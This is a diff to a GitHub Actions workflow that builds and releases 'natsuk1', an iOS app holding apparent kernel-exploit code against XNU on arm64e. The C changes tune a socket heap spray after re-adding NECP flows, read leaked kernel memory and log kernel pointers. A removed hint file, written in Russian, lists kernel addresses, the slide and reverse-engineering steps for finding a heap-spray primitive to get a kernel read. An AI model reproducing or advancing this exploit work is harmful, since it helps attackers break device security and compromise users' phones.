@@ -116,7 +116,8 @@ jobs:
           #include <fcntl.h>
           #include <sys/syscall.h>
           #include <sys/socket.h>
-          #include <sys/uio.h>
+          #include <netinet/in.h>
+          #include <arpa/inet.h>
           #include <mach/mach.h>
           #include <mach/message.h>
 
@@ -143,7 +144,7 @@ jobs:
 
           #define NCF_ASN 0x20
           #define RESBUF 8192
-          #define SPRAY_SOCKS 32
+          #define SPRAY_SOCKS 64
 
           static volatile int g_busy = 0;
           static volatile int g_cancel = 0;
@@ -199,24 +200,34 @@ jobs:
 
           static int spray_sockets(uint64_t target, int held[]) {
               int sent = 0;
+              uint16_t base_port = (uint16_t)((target >> 8) & 0xF000);
               for (int i = 0; i < SPRAY_SOCKS; i++) {
                   if (g_cancel) break;
                   int s = socket(AF_INET, SOCK_STREAM, 0);
-                  if (s < 0) break;
+                  if (s < 0) {
+                      LW("SOC", "socket[%d] errno=%d", i, errno);
+                      break;
+                  }
                   struct sockaddr_in sa;
                   memset(&sa, 0, sizeof(sa));
                   sa.sin_family = AF_INET;
-                  sa.sin_port = htons((uint16_t)(target & 0xFFFF));
-                  sa.sin_addr.s_addr = (uint32_t)(target >> 32);
-                  if (bind(s, (struct sockaddr*)&sa, sizeof(sa)) == 0) sent++;
-                  else { close(s); continue; }
-                  if (i < 32) held[i] = s;
+                  sa.sin_port = htons((uint16_t)(base_port + i));
+                  sa.sin_addr.s_addr = htonl(0x7F000001);
+                  if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
+                      LW("SOC", "bind[%d] errno=%d", i, errno);
+                      close(s);
+                      continue;
+                  }
+                  held[sent] = s;
+                  sent++;
               }
               return sent;
           }
 
           static void drain_sockets(int held[], int n) {
-              for (int i = 0; i < n; i++) if (held[i] >= 0) { close(held[i]); held[i] = -1; }
+              for (int i = 0; i < n; i++) {
+                  if (held[i] >= 0) { close(held[i]); held[i] = -1; }
+              }
           }
 
           static void probe_tlv_types(void) {
@@ -242,7 +253,8 @@ jobs:
               close(fd);
           }
 
-          static int try_read_df(uint64_t target, uint8_t *out, int outsz, int *out_ret, int *socks_out) {
+          static int try_read_df(uint64_t target, uint8_t *out, int outsz,
+                                 int *out_ret, int *socks_out) {
               int fd = nfd();
               if (fd < 0) return -1;
               uint8_t cu[16], fu1[16], fu2[16];
@@ -256,8 +268,8 @@ jobs:
               int r3 = nadd_flow(fd, cu, fu2);
               LI("DF", "re-add=%d", r3);
 
-              int held[32];
-              for (int i = 0; i < 32; i++) held[i] = -1;
+              int held[SPRAY_SOCKS];
+              for (int i = 0; i < SPRAY_SOCKS; i++) held[i] = -1;
               int socks = spray_sockets(target, held);
               LI("DF", "sockets=%d", socks);
               if (socks_out) *socks_out = socks;
@@ -273,14 +285,14 @@ jobs:
                   memcpy(out, buf, n);
               }
 
-              drain_sockets(held, 32);
+              drain_sockets(held, socks);
               close(fd);
               return c;
           }
 
           static int impl(void) {
               nk_log("");
-              nk_log("=== natsuk1 v3.3 (natsuk1-df-v23) ===");
+              nk_log("=== natsuk1 v3.4 (natsuk1-df-v24) ===");
               nk_log("target: iOS 27.0 / XNU / arm64e");
               nk_log("");
               LI("INIT", "NCF_ASN=0x%x SOCKS=%d", NCF_ASN, SPRAY_SOCKS);
@@ -314,7 +326,8 @@ jobs:
                       for (int k = 0; k + 8 <= r; k++) {
                           uint64_t v;
                           memcpy(&v, buf + k, 8);
-                          if (is_kptr(v)) LO("HIT", "  +0x%x = 0x%llx", k, (unsigned long long)v);
+                          if (is_kptr(v)) LO("HIT", "  +0x%x = 0x%llx",
+                                             k, (unsigned long long)v);
                       }
                   } else {
                       LI("TRY", "no kptr");
@@ -341,89 +354,6 @@ jobs:
               nk_log("[!] cancel requested");
           }
           NECP
-
-      - name: Write NEXTHINT.txt
-        run: |
-          cat > NEXTHINT.txt <<'TXT'
-          Ghidra — kernel.raw (iOS 27.0 / 24A437), slide 0x3D00000
-
-          ==============================================================
-          КЛЮЧЕВОЙ ВЫВОД из v22:
-          ==============================================================
-          mach_msg отправляет ipc_kmsg в СВОЮ СОБСТВЕННУЮ ЗОНУ (ipc_kmsg_zone),
-          НЕ в kalloc.1024. Поэтому spray работает (spray=128), но
-          никогда не реклеймит necp_client_flow.
-
-          Проверить в Ghidra: ipc_kmsg_alloc / ipc_kmsg_zone_init.
-          Если зона отдельная — mach_msg бесполезен для NECP-flow spray.
-
-          Нужен другой примитив аллокации в kalloc.1024:
-          - socket() struct (soalloc) — размер структуры?
-          - sendmsg с SCM_RIGHTS
-          - IOCommand allocate
-          - pipe / F_SETPIPE_SZ
-
-          ==============================================================
-          TARGET 1 — necp_client_copy_result @ 0xFFFFFFF00A4EAC7C
-          ==============================================================
-          В Ghidra: Go To → 0xFFFFFFF00A4EAC7C + slide.
-          (Со slide 0x3D00000 → 0xFFFFFFF00E1EAC7C)
-
-          Задачи:
-          1. Найти в дизасме итерацию по flow_list:
-             ldr xN, [x_client, #off_list_head]
-             cbz xN, end
-             body:
-                ldr xM, [xN, #off_next]
-                ...
-                ldr xK, [xN, #off_assigned]   ← ЭТО НУЖНО
-             Определить off_assigned — реальный NCF_ASSIGNED_OFF.
-
-          2. Отдельно проверить: какие поля flow читает copy_result:
-             - Сколько последовательных ldr (uint64) по xN?
-             - Есть ли memcpy с длиной не 0x18 (не 24)?
-
-          3. Найти вызов copyout (syscall) в конце — это передача в userspace.
-
-          Что записать:
-          - NCF_ASSIGNED_OFF (offset от flow)
-          - NCF_ASSIGNED_LEN_OFF
-          - Какой регистр хранит flow (обычно x19..x24)
-
-          ==============================================================
-          TARGET 2 — necp_client_add_flow @ 0xFFFFFFF00A4E843C
-          ==============================================================
-          1. Найти kalloc в прологе:
-                mov w0, #N
-                bl kalloc
-             Записать N — размер flow struct. Определить зону.
-          2. Найти куда пишется flow->assigned_results после alloc:
-                str xzr, [x_flow, #OFF]
-             Это подтвердит offset.
-
-          ==============================================================
-          TARGET 3 — определить размер и зону struct socket
-          ==============================================================
-          Символы: soalloc, socreate, socket_alloc.
-          1. Найти sizeof(struct socket) — аргумент kalloc/zalloc.
-          2. Если kalloc.1024 → использовать socket() для spray.
-          3. Проверить bind() — копирует ли sockaddr в kalloc.
-
-          ==============================================================
-          TARGET 4 — определить зону ipc_kmsg
-          ==============================================================
-          Символы: ipc_kmsg_alloc, ipc_kmsg_zone, ipc_kmsg_zone_init.
-          1. Подтвердить, что ipc_kmsg НЕ из kalloc.1024.
-          2. Если так — все наши mach_msg spray были мимо.
-
-          ==============================================================
-          PRIORITY
-          ==============================================================
-          1. TARGET 3 — найти kalloc.1024 primitive для spray.
-             Это блокирующий шаг. Без него kread не заработает.
-          2. TARGET 1 — подтвердить NCF_ASSIGNED_OFF (0x20 или другой).
-          3. TARGET 4 — подтвердить, что ipc_kmsg бесполезен.
-          TXT
 
       - name: Write OverviewView.swift
         run: |
@@ -966,15 +896,15 @@ jobs:
             if eval "$2" >/dev/null 2>&1; then echo "  OK   $1"; else echo "  FAIL $1"; FAIL=1; fi
           }
           echo "--- necp.c ---"
-          chk "marker v23"        "grep -q -e 'natsuk1-df-v23' $F"
+          chk "marker v24"        "grep -q -e 'natsuk1-df-v24' $F"
+          chk "netinet/in.h"      "grep -q -e '#include <netinet/in.h>' $F"
+          chk "arpa/inet.h"       "grep -q -e '#include <arpa/inet.h>' $F"
           chk "socket spray"      "grep -q -e 'static int spray_sockets' $F"
-          chk "local_port fix"    "grep -q -e 'h->msgh_local_port = MACH_PORT_NULL' $F || grep -q -e 'spray_sockets' $F"
+          chk "no leftover spray_t"  "! grep -q -e 'typedef struct {' $F"
 
           echo "--- OverviewView ---"
           chk "Exploit cpu"       "grep -q -e 'Label(\"Exploit\", systemImage: \"cpu\")' $O"
-          chk "Logs terminal"     "grep -q -e 'systemImage: \"terminal\"' $O"
           chk "LogActions doc"    "grep -q -e 'Label(\"Log Actions\", systemImage: \"document.on.document\")' $O"
-          chk "no row icons"      "! grep -q -e 'Image(systemName: \"bolt.fill\")' $O"
 
           echo "--- ContentView ---"
           chk "tab Overview grid" "grep -q -e 'square.grid.2x2' $C"
@@ -988,7 +918,6 @@ jobs:
           echo "--- AirliftView ---"
           chk "Exploit cpu"        "grep -q -e 'Label(\"Exploit\", systemImage: \"cpu\")' $A"
           chk "LogActions doc"     "grep -q -e 'Label(\"Log Actions\", systemImage: \"document.on.document\")' $A"
-          chk "no row icons"       "! grep -q -e 'Image(systemName: \"bolt.fill\")' $A"
 
           echo "--- RuntimeView ---"
           chk "Runtime ecg"        "grep -q -e 'Label(\"Runtime\", systemImage: \"waveform.path.ecg\")' $R"
@@ -1059,7 +988,7 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "icons per spec, socket spray, NEXTHINT updated"
+            --notes "fix netinet/in.h include, socket spray cleanup"
 
       - name: Commit
         run: |
@@ -1076,8 +1005,7 @@ jobs:
             natsuk1/Views/ToolsView.swift \
             natsuk1/Views/ContentView.swift \
             natsuk1/natsuk1.swift \
-            natsuk1/Helpers/AirliftBridge.swift \
-            NEXTHINT.txt
+            natsuk1/Helpers/AirliftBridge.swift
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "icons per spec + socket spray + NEXTHINT [skip ci]"
+          git commit -m "fix netinet include + cleanup spray [skip ci]"
           git push
